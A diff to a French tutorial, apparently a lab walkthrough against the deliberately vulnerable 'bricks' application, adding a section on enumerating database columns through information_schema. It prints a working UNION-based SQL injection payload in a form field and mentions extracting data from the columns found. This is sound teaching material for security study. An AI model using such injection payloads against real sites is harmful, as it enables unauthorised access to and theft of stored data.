@@ -472,7 +472,7 @@ Ici, la base qui nous intéresse est `bricks`.
 
 Lister les tables se fait avec la requête SQL suivante :
 ```
-SELECT group_concat(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema='nom_de_la_table';
+SELECT group_concat(0x7c,table_name,0x7c) FROM information_schema.tables WHERE table_schema='nom_de_la_bdd';
 ```
 
 ![Récupération des Tables](images/list_tables.png)
@@ -486,7 +486,29 @@ La base de données `bricks` ne contient ici qu'une seule table : `users`.
 
 ## Lister les colonnes
 
+Une fois que la table est connue, on peut lister les colonnes de la table.
+Ici, la table visée est `users` de la base de donnée `bricks`.
 
+Lister les tables se fait avec la requête SQL suivante :
+```
+SELECT group_concat(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name='nom_de_la_table';
+```
+
+Ici, il y a plusieurs tables `users`, sur différentes bases de données. On va donc préciser le nom de la base de donnée dans notre requête.
+
+```
+SELECT group_concat(0x7c,column_name,0x7c) FROM information_schema.columns WHERE table_name='nom_de_la_table' AND table_schema='nom_de_la_bdd';
+```
+
+![Récurération des colonnes d'une Table avec UNION](images/r%C3%A9cup_colonnes.png)
+
+Soit, l'injection SQL suivante :
+
+```
+username=tom'+UNION+SELECT+NULL,NULL,group_concat(0x7c,column_name,0x7c),NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+WHERE+table_name='users'+AND+table_schema='bricks'+LIMIT+1,1;--+&submit=Submit
+```
+
+Une fois les tables et colonnes identifiées. On peut récupérer des données comme vu précédement en insérant un `SELECT nom_de_colonne FROM table`.
 
 ## Upload de fichier
 
